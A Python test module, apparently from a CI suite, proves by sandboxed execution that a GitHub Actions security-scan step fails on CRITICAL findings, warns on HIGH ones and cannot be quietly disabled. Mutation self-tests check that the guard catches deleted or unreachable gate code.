"""
Behavioural guard: the `Security Scan Gate` severity block must actually FAIL the
build on a CRITICAL finding — proven by running it, not by reading it.

WHY THIS EXISTS (and why it is not another parser)
--------------------------------------------------
`test_ci_security_gate.py` asserts the gate's `exit 1` by scanning `run:` text.
That approach was defeated three times running, each fix looking closed until the
next adversarial pass:

    original guard        1 shape   a `#` comment line anchored the scan in itself
    #402's fix            4 shapes  quoted string / heredoc / YAML scalar / dead branch
    the line-anchor fix   6 shapes  + space-indented heredoc terminator, two
                                    heredocs on a line, split and non-word
                                    delimiters, and ANY multi-line YAML scalar

In every one the block was deleted, the YAML stayed valid, bash exited 0 on a
CRITICAL, and the guard returned a body containing `exit 1`. ADR-001 calls a
third patch to an enumeration a redesign signal. The root cause is structural:
"the anchor starts a line" is a NECESSARY condition for "the anchor is in shell
command position", never a sufficient one, and no line scanner reaches the
reachability shapes at all — `if false; then <gate> fi`, an `elif` that cannot be
true, or `case … never) exit 1 ;;`.

Executing the block collapses all of that. There is nothing to evade: either the
process exits non-zero on a CRITICAL or it does not.

It collapses the SHELL-level class only. A WORKFLOW-level disable — a step-level
`if: false` — is invisible to the executed body, and the first draft of this file
wrongly listed it as covered. `test_gate_step_has_no_if_condition` closes that
half separately.

SEMANTICS
---------
BEHAVIOUR, not presence. Rewriting, reformatting or reordering the gate stays
green as long as a CRITICAL still fails and a clean scan still passes. Deleting
it, commenting it out, or making it unreachable by any means trips this.

EXECUTION SAFETY (read before editing the extractor)
----------------------------------------------------
This runs shell taken from a workflow file, so a mis-extraction executes
something unintended. A first prototype used a greedy regex, captured the rest of
the file, and really did start `python3 -m http.server 8080` and `npx lighthouse`
on the developer's machine. Three guardrails, all fail-closed:

1. Extraction is bounded by INDENTATION — it stops at the first non-blank line
   indented at or below the `run:` key's column.
2. Every command word in the extracted block must be in `_ALLOWED_COMMANDS`. An
   unrecognised one aborts WITHOUT running anything. Direction is a false alarm:
   a legitimate new command in the gate makes this test fail loudly and demand a
   one-line allowlist update, which is the review moment we want.
3. The block runs in a fresh temp cwd with stdin closed and a hard timeout.

stdlib-only, no network, and the only subprocess is the gate itself under the
guardrails above. Runs under pytest and `python3 -m unittest`.

OWASP CICD-SEC-1 (Insufficient Flow Control); NIST SSDF (SP 800-218) PO.3, PW.4.
"""

import re
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

# Dual-runner import of the shared guard primitives (see _ci_guard_util's
# IMPORT CONTRACT). Never hand-write `key\s*:` — that is the exact blindness
# `explicit_key_lines` and the shared key-shape rule exist to stop, and the first
# version of this file repeated it with a hardcoded `^\s{8}(?:if|"if"|'if')\s*:`.
sys.path.insert(0, str(Path(__file__).resolve().parent))
from _ci_guard_util import (  # noqa: E402
    apply_mutation,
    block_ends_at,
    apply_regex_mutation,
    explicit_key_lines,
    keys_at_column,
    strip_inline_comment_sh,
)

# The gate needs none of the parent's HOME/PATH/etc, and a leaked credential in
# the environment has no business inside a script read out of a workflow file.
# `LC_ALL=C` rather than `C.UTF-8`: Darwin's libc has no `C.UTF-8` locale, so it
# fell back with a `setlocale` warning into captured stderr. Byte semantics are
# correct here — the gate's pattern and the scanner's output are both UTF-8 byte
# sequences and `.` spanning bytes does not change what matches.
_MINIMAL_ENV = {"PATH": "/usr/bin:/bin", "LC_ALL": "C"}

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOW = REPO_ROOT / ".github" / "workflows" / "security-scan.yml"
STEP_NAME = "Check for critical/high failures"

# Command words the severity gate is allowed to invoke. Anything else aborts
# before execution (see EXECUTION SAFETY above).
_ALLOWED_COMMANDS = frozenset({"grep", "echo", "true", "exit", "wc", "cat", "printf"})

# Shell keywords and operators that are not commands.
_SHELL_WORDS = frozenset(
    {"if", "then", "else", "elif", "fi", "for", "do", "done", "while", "case", "esac"}
)

# A generous ceiling. The gate is ~11 lines; anything far larger means the
# extractor over-captured, which is exactly how the prototype ran a web server.
_MAX_BLOCK_LINES = 40

# Taken from the shape scanner/lib/output.sh actually emits, not invented. The
# first version used `✗ CRITICAL: …`, which matched only via the gate's
# `✗.*critical` arm — so if the emitter ever dropped the glyph the gate would go
# dead in production while this test stayed green (review of #404, F6).
# `test_fixture_matches_the_real_emitter` pins the two together.
_CRITICAL_FIXTURE = "✗ FAIL  [SEC-001] hardcoded secret in config (CRITICAL)\n"
_CLEAN_FIXTURE = "✓ All checks passed\n"

# Same emitter shape, HIGH severity. The gate must WARN on this and exit 0 —
# only CRITICAL blocks a merge (#206). Carried over from
# `test_ci_security_gate.TestScanCriticalSeverityBlock.test_high_block_stays_nonblocking`,
# which asserted it by text; proving it by execution is what let that text guard
# (and the strip-order defect underneath it) be deleted outright.
_HIGH_FIXTURE = "✗ FAIL  [SEC-014] permissive CORS policy (HIGH)\n"


_STEP_NAME_RE = re.compile(r"^(\s*-\s+)name:\s*(.+?)\s*$")


def find_step_blocks(text: str, step_name: str) -> list:
    """Every `(key_col, line_no, block)` whose `- name:` value EQUALS `step_name`.

    Equality on the parsed value, not `in`. The first version used a substring
    test and took the first hit, so a PRECEDING step named
    `Check for critical/high failures (advisory preview)` shadowed the real one
    and the suite validated the decoy while the real gate echoed a notice
    (adversarial review of #404, F2). Duplicates are returned rather than
    silently resolved, so the caller can refuse to guess.

    `key_col` is the column the step's OWN mapping keys sit at, DERIVED from the
    `- name:` line. Round 2 of the review disarmed the workflow-level checks by
    dedenting the `steps:` list by 2 — valid YAML (a block sequence may sit at
    its parent key's indent), a cosmetic diff, and enough to walk the step keys
    out from under a hardcoded `^\\s{8}` anchor with the suite green. Nothing
    here may hardcode a column again.

    The dash column is taken from the line's own indentation rather than
    `line.index("- name:")`, which raised an uncaught `ValueError` on the valid
    `-  name:` (two spaces) spelling."""
    lines = text.splitlines()
    out = []
    for i, line in enumerate(lines):
        m = _STEP_NAME_RE.match(line)
        if not m or m.group(2).strip("\"'") != step_name:
            continue
        dash_col = len(line) - len(line.lstrip())
        key_col = len(m.group(1))
        block = [line]
        for nxt in lines[i + 1:]:
            if block_ends_at(nxt, dash_col):
                break
            block.append(nxt)
        out.append((key_col, i, "\n".join(block)))
    return out


# Literal block scalars only. A FOLDED scalar (`>`) joins lines with spaces,
# which changes shell meaning, and any other form is unrecognised — both fail
# closed rather than being guessed at.
_RUN_LITERAL_RE = re.compile(r"^(\s*)run:\s*\|[+-]?\s*$")


def extract_run_block(text: str, step_name: str):
    """The dedented body of `step_name`'s literal `run: |` block, or None.

    Scoped to the step, twice over. The first version searched FORWARD from the
    step name for the next line equal to `run: |`, which walks straight out of
    the step when the gate uses any other spelling. `run: |-` — semantically
    identical for a shell step, and a one-character edit — made this return the
    `lighthouse` job's `Serve and audit` body, so the suite really did execute
    `python3 -m http.server 8080 &` and `npx lighthouse`: the exact prototype
    disaster the docstring claimed was fixed (adversarial review of #404, F4).

    Now: locate the step block (indentation-bounded), require exactly one, and
    take the `run:` key from INSIDE that block AT THE STEP'S OWN KEY COLUMN. The
    column anchor matters: searching at any depth is first-wins across nesting,
    so a step-level `env:` mapping carrying a key literally named `run` — valid
    YAML, valid Actions — placed before the real `run:` was extracted instead. A
    gate-shaped decoy body there passes both behavioural directions while the
    real `run:` only echoes a notice (review of #404, round 2). An unrecognised
    scalar form returns None, which trips the `test_step_is_found` canary loudly.
    """
    blocks = find_step_blocks(text, step_name)
    if len(blocks) != 1:
        return None
    key_col, _, block = blocks[0]
    lines = block.splitlines()
    run_i = next(
        (
            i for i, l in enumerate(lines)
            if _RUN_LITERAL_RE.match(l) and (len(l) - len(l.lstrip())) == key_col
        ),
        None,
    )
    if run_i is None:
        return None
    run_col = key_col
    body = []
    for line in lines[run_i + 1:]:
        if line.strip() and (len(line) - len(line.lstrip())) <= run_col:
            break
        body.append(line)
    if not body:
        return None
    # NOT `key_column`: this dedents a block SCALAR, where a `#` line is shell
    # content rather than a comment. Excluding those lines would compute the
    # wrong indent and corrupt the script. See `block_ends_at` for the
    # measured parser difference between a mapping and a scalar.
    indent = min((len(l) - len(l.lstrip())) for l in body if l.strip())
    return "\n".join(l[indent:] if l.strip() else "" for l in body).rstrip() + "\n"



# `keys_at_column` now lives in `_ci_guard_util` (imported above). It was defined
# here first, for #404; `test_ci_required_graph_not_disabled.py` needed the same
# primitive, and two copies of a matcher this repo has already had to fix eight
# times is how the next fix reaches only one of them. The quoted spellings stay
# pinned by `TestWorkflowLevelDisableDetector` below — this file's consumers are
# what those mutations exercise, so moving the implementation does not move the
# evidence.


# A top-level job key: exactly 2-space indent under `jobs:`, bare or quoted.
_JOB_HEADER_RE = re.compile(rf"""^  (?:"[^"]+"|'[^']+'|[A-Za-z0-9_.\-]+)\s*:\s*(?:#.*)?$""")

# Job mapping keys sit 2 columns in from the job key itself.
_JOB_KEY_COL = 4


def enclosing_job_block(text: str, line_no: int):
    """The job block containing `line_no`, or None.

    Needed because a JOB-level disable is invisible to any step-scoped check:
    `continue-on-error: true` on the `scan` job makes the whole job conclude
    success, and `security-scan-gate` accepts `success` — so a CRITICAL stops
    blocking while every step-level assertion stays green (review of #404,
    round 2, X4)."""
    lines = text.splitlines()
    start = next(
        (i for i in range(min(line_no, len(lines) - 1), -1, -1) if _JOB_HEADER_RE.match(lines[i])),
        None,
    )
    if start is None:
        return None
    out = [lines[start]]
    for line in lines[start + 1:]:
        if block_ends_at(line, 2):
            break
        out.append(line)
    return "\n".join(out)


# Step keys that neutralise the gate. `if:` skips the step; `continue-on-error`
# discards its exit code (zero enforcement of that key existed anywhere in the
# repo, and it is already used in dast-full-scan.yml, dast-baseline.yml and
# lint.yml, so adding it to the gate would read as routine — review of #404, F1);
# `shell:` means CI stops running the body under `bash`, which is the one thing
# this suite actually proves.
_STEP_DISABLING_KEYS = {
    "if": "a step-level `if:` — the runner skips the step entirely",
    "continue-on-error": "step-level `continue-on-error` — the runner discards the step's exit code",
    "shell": "a `shell:` override — this suite proves the body under `bash`, so CI would run something it has not proven",
}

_JOB_DISABLING_KEYS = {
    "continue-on-error": (
        "job-level `continue-on-error` — the whole job concludes success and "
        "`security-scan-gate` accepts `success`, so a CRITICAL stops blocking"
    ),
}


def workflow_level_disables(text: str, step_name: str) -> list:
    """Every WORKFLOW-level way the severity gate is disabled, as
    `(kind, detail)` pairs. Empty list == the gate really runs and its exit code
    really counts.

    Separate from the executed-body proof on purpose: these keys are consumed by
    the RUNNER, so the `run:` body cannot see them and executing it stays green
    while the gate never runs (or its exit code is discarded) in CI.

    One function rather than assertions inlined in the tests, so
    `TestWorkflowLevelDisableDetector` can mutate a copy of the workflow and prove
    each shape is CAUGHT — the same mutation-self-test treatment the shell half
    has had from the start. The workflow half had none and was defeated four ways
    on its first adversarial pass; every shape below is one of those, pinned.

    Fails CLOSED: anything that stops the step from being located uniquely is
    reported as a disable rather than skipped."""
    blocks = find_step_blocks(text, step_name)
    if len(blocks) != 1:
        return [(
            "missing",
            f"expected exactly one step named {step_name!r}, found {len(blocks)} — "
            "refusing to guess which one CI runs",
        )]
    key_col, line_no, block = blocks[0]

    reasons = []
    present = keys_at_column(block, key_col)
    for key, why in _STEP_DISABLING_KEYS.items():
        if key in present:
            reasons.append((key, why))
        # YAML's explicit-key form declares the same key while the substring
        # `key:` never appears, so no line matcher can reach it. Fail closed on
        # the shape (the `unscannable_*` tripwire pattern, ADR-001 §4).
        elif explicit_key_lines(block, key):
            reasons.append((key, f"{why} (declared with the `? {key}` explicit-key form)"))

    job = enclosing_job_block(text, line_no)
    if job is None:
        reasons.append(("missing", "could not locate the job enclosing the gate step"))
    else:
        job_present = keys_at_column(job, _JOB_KEY_COL)
        for key, why in _JOB_DISABLING_KEYS.items():
            if key in job_present or explicit_key_lines(job, key):
                reasons.append(("job-" + key, why))
    return reasons


def _split_statements(script: str) -> list:
    r"""Split `script` on shell separators, QUOTE-AWARE.

    A naive `re.split(r"[;\n]|\|\||&&|\|", …)` cuts inside quoted strings. The
    gate's own `grep -ci '✗.*critical\|CRITICAL.*Fail'` carries an escaped `\|`
    inside single quotes, so the naive split produced the phantom "commands"
    `CRITICAL.*Fail` and `HIGH.*Fail` — the ERE-pipe class this repo has hit
    before. A separator inside quotes is not a separator."""
    out, buf, quote = [], [], None
    i = 0
    while i < len(script):
        ch = script[i]
        if quote:
            buf.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < len(script):
                buf.append(script[i + 1]); i += 2; continue
            if ch == quote:
                quote = None
        elif ch in "'\"":
            quote = ch; buf.append(ch)
        elif ch in ";\n":
            out.append("".join(buf)); buf = []
        elif ch == "&" and script[i:i + 2] == "&&":
            out.append("".join(buf)); buf = []; i += 2; continue
        elif ch == "|":
            out.append("".join(buf)); buf = []
            if script[i:i + 2] == "||":
                i += 2; continue
        else:
            buf.append(ch)
        i += 1
    out.append("".join(buf))
    return out


def unexpected_commands(script: str) -> list:
    """Command words in `script` outside `_ALLOWED_COMMANDS`.

    Deliberately crude and over-reporting: the first word of every statement,
    split on `;`, `|`, `&&`, `||` and newlines, minus shell keywords, assignments
    and `$(`-substitution openers. A false hit costs one allowlist line; a false
    MISS would execute an unvetted command from a workflow file."""
    found = []
    for stmt in _split_statements(script):
        stmt = stmt.strip()
        if not stmt or stmt.startswith("#"):
            continue
        # `VAR=$(cmd ...)` — judge the substituted command, not the assignment.
        m = re.match(r"^[A-Za-z_][A-Za-z0-9_]*=\$\((.*)$", stmt)
        if m:
            stmt = m.group(1).strip()
        elif re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", stmt):
            continue
        word = stmt.split()[0].strip("()$`\"'")
        if not word or word in _SHELL_WORDS or word.startswith("["):
            continue
        if word not in _ALLOWED_COMMANDS:
            found.append(word)
    return sorted(set(found))


EMITTER = REPO_ROOT / "scanner" / "lib" / "output.sh"

# The emitter's per-finding failure line: an `echo` whose double-quoted argument
# interpolates the finding's severity. Exactly one such line is expected; zero or
# many means the emitter was restructured and this linkage must be re-derived by
# a human rather than guessed at.
_ECHO_ARG_RE = re.compile(r'^\s*echo\b[^"]*"(.*)"\s*$')

# `if [ "$VAR" -gt N ]; then` — the shape whose body carries the gate's `exit`.
_IF_GT_RE = re.compile(r'^\s*if\s+\[\s+"\$(\w+)"\s+-gt\s+-?\d+\s+\]\s*;\s*then\s*$')

_BLOCK_OPEN_RE = re.compile(r"^(?:if|for|while|until|case)\b")
_EXIT_NONZERO_RE = re.compile(r"^exit\s+[1-9]")


def emitter_failure_sample(emitter_text: str):
    """One line `scanner/lib/output.sh` really prints for a CRITICAL finding, or
    None.

    Rendered from the emitter's own `echo`, not invented: `${severity}` becomes
    `CRITICAL` and every other interpolation becomes empty (they are colour
    escapes and per-finding text). Deriving the sample from the EMITTER is the
    whole point — a sample built from `_CRITICAL_FIXTURE` would let the gate be
    narrowed to a fixture-only token and stay green (review of #404, round 2,
    X9).

    The line is read with its trailing shell comment stripped, so leaving the old
    shape alive only in a `# was: ✗ FAIL` comment does not satisfy the linkage
    (X10) — it removes the candidate entirely and this returns None, which the
    caller reports as a mismatch. Fail closed."""
    cands = []
    for raw in emitter_text.splitlines():
        line = strip_inline_comment_sh(raw)
        if "severity" not in line:
            continue
        m = _ECHO_ARG_RE.match(line)
        if m:
            cands.append(m.group(1))
    if len(cands) != 1:
        return None

    def _render(m):
        name = m.group(1) or m.group(2)
        return "CRITICAL" if name == "severity" else ""

    return re.sub(r"\$\{(\w+)[^}]*\}|\$(\w+)", _render, cands[0])


def gate_failing_variable(script: str):
    """The counter whose `-gt` test encloses the gate's non-zero `exit`, or None."""
    lines = script.splitlines()
    for i, line in enumerate(lines):
        m = _IF_GT_RE.match(line)
        if not m:
            continue
        depth = 1
        for nxt in lines[i + 1:]:
            s = nxt.strip()
            if _BLOCK_OPEN_RE.match(s):
                depth += 1
            elif s in ("fi", "done", "esac"):
                depth -= 1
                if depth == 0:
                    break
            elif _EXIT_NONZERO_RE.match(s):
                return m.group(1)
    return None


def gate_count_pattern(script: str, var: str):
    """The single-quoted pattern the gate counts `var` with, or None."""
    m = re.search(rf"^\s*{re.escape(var)}=\$\(\s*grep\s+(?:-\S+\s+)*'([^']*)'", script, re.M)
    return m.group(1) if m else None


def _grep_matches(pattern: str, text: str) -> bool:
    """Whether `grep -ci <pattern>` counts at least one line in `text`.

    Runs the REAL grep, the same tool CI runs, because the pattern is a POSIX BRE
    (`\\|` alternation) and re-implementing it in Python `re` is precisely the
    kind of second parser this file exists to avoid. The pattern is passed as an
    argv element after `-e`, with no shell — grep matches text, it does not
    execute patterns, so nothing here can run a command out of the workflow."""
    r = subprocess.run(
        ["grep", "-c", "-i", "-e", pattern],
        input=text if text.endswith("\n") else text + "\n",
        capture_output=True,
        text=True,
        timeout=30,
        env=_MINIMAL_ENV,
    )
    return r.returncode == 0 and int(r.stdout.strip() or 0) > 0


def gate_emitter_mismatch(script: str, emitter_text: str) -> list:
    """Reasons the gate's own grep pattern cannot match what the scanner really
    prints. Empty list == the gate is live against production output.

    Both ends are pinned, which is what the first version did not do. It asserted
    only that the string `✗ FAIL` appeared somewhere in `output.sh` — nothing
    connected that to the gate's pattern, so narrowing the gate to a token only
    the fixture contains left the suite green while the gate matched nothing in
    CI. Here the pattern is taken from the gate, the sample is rendered from the
    emitter, and they are matched with grep."""
    var = gate_failing_variable(script)
    if var is None:
        return ["cannot locate the counter whose `-gt` test encloses the gate's non-zero exit"]
    pattern = gate_count_pattern(script, var)
    if pattern is None:
        return [f"cannot locate the `grep` that assigns ${var}"]
    sample = emitter_failure_sample(emitter_text)
    if sample is None:
        return [
            "cannot locate scanner/lib/output.sh's per-finding failure line "
            "(exactly one `echo` interpolating ${severity} is expected) — "
            "re-derive this linkage by hand"
        ]
    out = []
    if not _grep_matches(pattern, sample):
        out.append(
            f"the gate counts ${var} with {pattern!r}, which does NOT match what the "
            f"emitter prints for a CRITICAL ({sample!r}) — the gate is dead in production"
        )
    if not _grep_matches(pattern, _CRITICAL_FIXTURE):
        out.append(
            f"the gate's pattern {pattern!r} does not match _CRITICAL_FIXTURE — the "
            "behavioural tests feed it output the gate cannot count"
        )
    return out


class UnvettedCommand(RuntimeError):
    """Raised INSTEAD of executing a script containing a non-allowlisted word."""


def run_gate(script: str, scan_output: str):
    """Execute `script` in a throwaway cwd holding `scan-output.txt`.

    The allowlist is enforced HERE, as a precondition. It used to be only a
    separate assertion (`test_only_allowlisted_commands`), so it stopped nothing:
    under `python3 -m unittest` the alphabetically earlier
    `test_critical_finding_fails_the_build` ran first and executed whatever had
    been extracted. Combined with the extraction hijack that meant a foreign
    `run:` body really did execute — the PR body called this guardrail
    "aborts before running anything" while the code did not (adversarial review
    of #404, F4). Now it does."""
    bad = unexpected_commands(script)
    if bad:
        raise UnvettedCommand(
            f"refusing to execute: {bad} not in _ALLOWED_COMMANDS. "
            "Review the command, then add it to the allowlist."
        )
    with tempfile.TemporaryDirectory() as d:
        Path(d, "scan-output.txt").write_text(scan_output, encoding="utf-8")
        Path(d, "gate.sh").write_text(script, encoding="utf-8")
        return subprocess.run(
            ["bash", "gate.sh"],
            cwd=d,
            capture_output=True,
            text=True,
            stdin=subprocess.DEVNULL,
            timeout=30,
            env=_MINIMAL_ENV,
        )


class TestSecurityGateBehaviour(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.text = WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else ""
        cls.script = extract_run_block(cls.text, STEP_NAME)

    def test_workflow_exists(self):
        self.assertTrue(WORKFLOW.is_file(), f"{WORKFLOW} not found — path assumption broke")

    def test_step_is_found(self):
        # Canary: renaming the step must fail loudly, not silently skip the only
        # behavioural proof the severity gate has.
        self.assertIsNotNone(
            self.script,
            f"step {STEP_NAME!r} with a `run: |` block not found in "
            f"{WORKFLOW.name}. If it was renamed, update STEP_NAME — do NOT let "
            "this test quietly stop running.",
        )

    def test_extraction_is_bounded(self):
        self.assertLessEqual(
            len(self.script.splitlines()),
            _MAX_BLOCK_LINES,
            "extracted block is far larger than the gate — the extractor "
            "over-captured and would execute unintended commands",
        )

    def test_only_allowlisted_commands(self):
        unexpected = unexpected_commands(self.script)
        self.assertEqual(
            unexpected,
            [],
            f"the gate now invokes {unexpected}, which is not in "
            "_ALLOWED_COMMANDS. Review the command, then add it — this test "
            "refuses to execute an unvetted command out of a workflow file.",
        )

    def test_gate_step_has_no_if_condition(self):
        """Executing the `run:` body cannot see the step's own `if:` key.

        Found by self-review AFTER the first draft of this file claimed the
        behavioural test caught "a step-level `if: false`". It does not: adding
        `if: false` to the step leaves the extracted script exiting 1 on the
        CRITICAL fixture — green — while in CI the step never runs at all and a
        critical stops blocking. Verified by mutating the real workflow.

        So the workflow-level half is asserted here, separately: the gate step
        must carry NO `if:` at all. Direction is presence — adding any condition,
        even a legitimate one, fails this and demands the reasoning be reviewed
        and this test updated. Job-level `if:` is NOT forbidden: the `scan` job is
        legitimately path-gated and `Security Scan Gate` treats `skipped` as
        passing."""
        hits = [r for r in workflow_level_disables(self.text, STEP_NAME) if r[0] in ("if", "missing")]
        self.assertEqual(
            hits,
            [],
            "the severity-gate step now carries a step-level `if:` — the executed "
            "`run:` body cannot see it, so this suite would stay green while the "
            f"step never runs in CI: {hits}",
        )

    def test_gate_step_does_not_swallow_its_exit_code(self):
        """`continue-on-error: true` would make the gate's `exit 1` irrelevant.

        Invisible to an executor — the exit code is discarded by the RUNNER, not
        by the script — so this needs its own workflow-level assertion, exactly
        like the step-level `if:` above."""
        hits = [
            r for r in workflow_level_disables(self.text, STEP_NAME)
            if r[0] in ("continue-on-error", "job-continue-on-error", "missing")
        ]
        self.assertEqual(
            hits,
            [],
            "the severity gate's exit code is now discarded by the runner — the "
            "job would conclude success on a CRITICAL while this suite stays green "
            f"because the script itself is unchanged: {hits}",
        )

    def test_critical_finding_fails_the_build(self):
        r = run_gate(self.script, _CRITICAL_FIXTURE)
        self.assertNotEqual(
            r.returncode,
            0,
            "the severity gate exited 0 on a CRITICAL finding — a critical no "
            "longer blocks the merge.\n"
            f"stdout:\n{r.stdout}\nstderr:\n{r.stderr}",
        )

    def test_fixture_matches_the_real_emitter(self):
        """The fixture must look like what the scanner really prints.

        Without this the gate's grep pattern and the emitter can drift apart:
        the gate stops matching real output (dead in production) while the
        synthetic fixture keeps it green."""
        self.assertTrue(EMITTER.is_file(), f"{EMITTER} not found")
        mismatch = gate_emitter_mismatch(self.script, EMITTER.read_text(encoding="utf-8"))
        self.assertEqual(
            mismatch,
            [],
            "the severity gate's grep pattern and the scanner's real output have "
            f"drifted apart — the gate is dead in production: {mismatch}",
        )

    def test_clean_scan_passes(self):
        # The other direction: the gate must not fail an ordinary build, or it
        # would be disabled within the day.
        r = run_gate(self.script, _CLEAN_FIXTURE)
        self.assertEqual(
            r.returncode, 0, f"clean scan failed the build.\nstdout:\n{r.stdout}\nstderr:\n{r.stderr}"
        )

    def test_high_finding_warns_but_does_not_fail_the_build(self):
        """Only CRITICAL blocks a merge; HIGH warns (#206).

        The third direction, and the one that kept the old text guard alive: a
        gate that failed on HIGH too would pass both `test_critical…` and
        `test_clean…` while breaking every ordinary build, and a gate rewritten
        to escalate HIGH silently changes the merge policy. Executing it proves
        the policy rather than pattern-matching the `HIGHS` branch, which is what
        `test_ci_security_gate.TestScanCriticalSeverityBlock` used to do through
        `conditional_body_from` — the function carrying the strip-order defect.
        """
        r = run_gate(self.script, _HIGH_FIXTURE)
        self.assertEqual(
            r.returncode,
            0,
            "a HIGH finding failed the build — only CRITICAL is supposed to block "
            "the merge (#206). If escalating HIGH is intended, change the policy "
            "deliberately and update this test.\n"
            f"stdout:\n{r.stdout}\nstderr:\n{r.stderr}",
        )
        self.assertIn(
            "::warning::",
            r.stdout,
            "the gate no longer WARNS on a HIGH finding — exiting 0 silently is "
            "not the same as reporting it, and the warning is the only signal a "
            "HIGH produces.",
        )


class TestGateBehaviourDetector(unittest.TestCase):
    """Mutation self-tests. Each case is a shape that defeated the line-scanning
    guard; executing the block catches all of them, including the three
    reachability shapes no text matcher can reach."""

    @classmethod
    def setUpClass(cls):
        cls.script = extract_run_block(
            WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else "", STEP_NAME
        )

    _GATE_RE = r'if \[ "\$CRITS" -gt 0 \]; then\n(?:.*\n)*?fi\n'

    def _assert_caught(self, mutant, why):
        # Backstop for the no-op-fixture class (review of #404, F7): a mutation
        # that silently matched nothing asserts on the UNMUTATED script, which is
        # vacuously green whenever the gate is already dead. The fixtures below
        # build their mutants with `apply_mutation` / `apply_regex_mutation`,
        # which raise AT THE POINT of the stale fixture with the pattern in the
        # message; this stays because it also covers mutants assembled by other
        # means — `test_gate_wrapped_in_an_unreachable_branch` appends text after
        # replacing, so its result differs from the original even when the
        # replacement misses, and only the helper can see that.
        self.assertNotEqual(
            mutant, self.script, "mutation did not apply — the test is vacuous: " + why
        )
        self.assertEqual(
            run_gate(mutant, _CRITICAL_FIXTURE).returncode, 0,
            "the mutation was supposed to disable the gate but did not: " + why,
        )

    def test_gate_deleted(self):
        m = apply_regex_mutation(
            self.script, self._GATE_RE, 'echo "::notice::$CRITS recorded"\n'
        )
        self._assert_caught(m, "gate block removed")

    def test_gate_replaced_by_a_quoted_decoy(self):
        m = apply_regex_mutation(
            self.script,
            self._GATE_RE,
            """echo 'legacy: if [ "$CRITS" -gt 0 ]; then exit 1; fi'\n""",
        )
        self._assert_caught(m, "gate replaced by a quoted mention of itself")

    def test_gate_wrapped_in_an_unreachable_branch(self):
        # The one fixture here whose own result cannot prove it applied: the
        # trailing `fi` makes the mutant differ from the original even if the
        # replacement missed, so `_assert_caught`'s no-op guard is blind to it and
        # a stale anchor would surface as a bash syntax error three asserts later.
        # `apply_mutation` is what makes the miss legible.
        m = apply_mutation(
            self.script,
            'if [ "$CRITS" -gt 0 ]; then',
            'if false; then\nif [ "$CRITS" -gt 0 ]; then',
        ).rstrip() + "\nfi\n"
        self._assert_caught(m, "gate wrapped in `if false; then … fi`")

    def test_gate_bound_moved_out_of_reach(self):
        # Anchored on `$CRITS` rather than the bare `-gt 0 ]; then`, which occurs
        # TWICE (the `$HIGHS` warning branch too). The old fixture replaced both
        # and read as if it had targeted the gate; raising the HIGHS threshold is
        # not what this case is about, and an un-counted literal that matches two
        # regions is the ambiguity `apply_regex_mutation` refuses outright.
        m = apply_mutation(
            self.script, 'if [ "$CRITS" -gt 0 ]; then', 'if [ "$CRITS" -gt 999999 ]; then'
        )
        self._assert_caught(m, "gate threshold raised beyond any real finding count")

    def test_exit_moved_into_a_dead_case_arm(self):
        m = apply_mutation(
            self.script, "  exit 1\n", '  case "${MODE:-run}" in never) exit 1 ;; esac\n'
        )
        self._assert_caught(m, "`exit 1` moved into an unreachable case arm")

    def test_escalating_high_to_a_merge_block_is_caught(self):
        """Non-vacuity for `test_high_finding_warns_but_does_not_fail_the_build`.

        Opposite direction to every other case here: the mutation makes the gate
        MORE aggressive, not less. Without this the HIGH test would pass on a
        gate that had been quietly rewritten to block on HIGH, since it never
        proves the assertion can fail."""
        m = apply_mutation(
            self.script,
            'echo "::warning::$HIGHS high finding(s) detected"',
            'echo "::warning::$HIGHS high finding(s) detected"\n  exit 1',
        )
        self.assertNotEqual(
            run_gate(m, _HIGH_FIXTURE).returncode,
            0,
            "the gate was mutated to block on HIGH and the guard did not notice — "
            "`test_high_finding_warns_but_does_not_fail_the_build` cannot fail",
        )


class TestEmitterLinkageDetector(unittest.TestCase):
    """Mutation self-tests for the gate-to-emitter link.

    The gate greps `scan-output.txt` for a shape the SCANNER prints. If the two
    drift the gate matches nothing, counts zero criticals and exits 0 forever —
    dead in production, green in every test that feeds it a synthetic fixture.
    The first version asserted only that the string `✗ FAIL` appeared somewhere
    in `output.sh`, which pins neither end: narrowing the gate's pattern to a
    token only the FIXTURE contains left the suite green (review of #404,
    round 2, X9), and so did leaving the shape alive only in a trailing comment
    (X10)."""

    @classmethod
    def setUpClass(cls):
        cls.script = extract_run_block(
            WORKFLOW.read_text(encoding="utf-8") if WORKFLOW.is_file() else "", STEP_NAME
        )
        cls.emitter = EMITTER.read_text(encoding="utf-8") if EMITTER.is_file() else ""

    def _assert_caught(self, script, emitter, why):
        self.assertFalse(
            script == self.script and emitter == self.emitter,
            "mutation did not apply — the test is vacuous: " + why,
        )
        self.assertNotEqual(
            gate_emitter_mismatch(script, emitter), [],
            "the gate can no longer match real scanner output and the guard did "
            "not notice: " + why,
        )

    def test_unmutated_gate_matches_the_real_emitter(self):
        self.assertEqual(gate_emitter_mismatch(self.script, self.emitter), [])

    # --- X9: the gate's pattern narrowed to a FIXTURE-only token -----------
    def test_gate_pattern_narrowed_to_a_fixture_only_token_is_caught(self):
        # `SEC-001` exists only in _CRITICAL_FIXTURE; the scanner never prints it.
        m = apply_regex_mutation(
            self.script, r"(CRITS=\$\(grep -ci ')[^']*(')", r"\1SEC-001\2"
        )
        self._assert_caught(m, self.emitter, "gate narrowed to a token only the fixture contains")

    # --- X10: the shape survives only in a trailing COMMENT ----------------
    def test_emitter_shape_surviving_only_in_a_comment_is_caught(self):
        # Two edits, each checked: `_assert_caught` below only asks whether the
        # PAIR (script, emitter) changed, so a chained `.replace` where the first
        # link missed and the second landed passed its vacuity check while
        # testing something else entirely.
        m = apply_mutation(self.emitter, '${color}✗ FAIL${NC}', '${color}NG${NC}')
        m = apply_mutation(
            m,
            '$title ${DIM}(${severity})${NC}"',
            '$title ${DIM}(${severity})${NC}"   # was: ✗ FAIL',
        )
        self._assert_caught(self.script, m, "the `✗ FAIL` shape lives only in an inline comment")

    # --- F6, for real this time: the glyph is dropped ----------------------
    def test_emitter_dropping_the_glyph_is_caught(self):
        m = apply_mutation(self.emitter, '✗ FAIL', 'FAILED')
        self._assert_caught(self.script, m, "the emitter dropped the `✗` the gate's pattern relies on")


